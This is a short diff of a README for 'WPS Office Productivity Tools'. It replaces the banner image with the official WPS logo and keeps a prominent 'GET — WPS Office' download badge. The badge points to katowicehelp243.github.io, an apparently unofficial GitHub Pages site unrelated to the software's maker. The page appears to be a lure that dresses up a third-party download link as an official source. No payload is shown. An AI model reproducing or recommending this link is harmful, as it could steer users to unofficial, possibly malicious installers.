@@ -1,6 +1,6 @@
 # WPS Office Productivity Tools for Documents and Business Workflows
 
-![Banner Placeholder](https://dingyue.ws.126.net/2025/0427/18cee4c7j00svcs9b005ud000md00e4m.jpg)
+![Banner Placeholder](https://upload.wikimedia.org/wikipedia/ru/thumb/8/84/WPS-logo.svg/1280px-WPS-logo.svg.png)
 
 [![GET — WPS Office](https://img.shields.io/badge/GET%20%E2%80%94%20WPS%20Office-0078D6?style=for-the-badge&logoColor=white)](https://katowicehelp243.github.io/.github/WPS-Office-Productivity)
 
